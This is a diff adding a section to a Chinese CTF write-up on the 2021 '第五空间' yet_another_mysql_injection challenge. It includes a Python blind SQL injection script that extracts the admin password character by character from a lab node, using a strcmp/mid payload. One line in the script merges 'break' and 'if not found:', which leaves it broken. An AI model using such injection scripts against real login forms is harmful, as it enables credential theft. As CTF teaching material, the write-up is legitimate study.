@@ -375,4 +375,38 @@ print(res)
 输入就出了
 
 # 0x03 第五空间 2021【yet_another_mysql_injection】（sql盲注）
-这题同样可以使用盲注
+这题同样可以使用盲注，但是效率比较低
+脚本：
+```python
+import requests  
+import string  
+  
+url = "http://node4.anna.nssctf.cn:28961/"   # 改成你的目标  
+charset = string.ascii_letters + string.digits + "_{}-"  
+max_len = 64  
+  
+def check(payload):  
+    data = {  
+        "username": "admin",  
+        "password": payload  
+    }  
+    r = requests.post(url, data=data)  
+    return "something wrong" not in r.text  
+  
+password = ""  
+  
+for pos in range(1, max_len + 1):  
+    found = False  
+    for ch in charset:  
+        payload = f"'/**/or/**/!strcmp(mid(password,{pos},1),'{ch}')#"  
+        if check(payload):  
+            password += ch  
+            print(f"[+] pos {pos}: {ch}")  
+            found = True  
+            break    if not found:  
+        print("[*] password end")  
+        break  
+  
+print("[+] password =", password)
+```
+原理就是查询成功的话，就算密码错了也会回显`wrong password`，
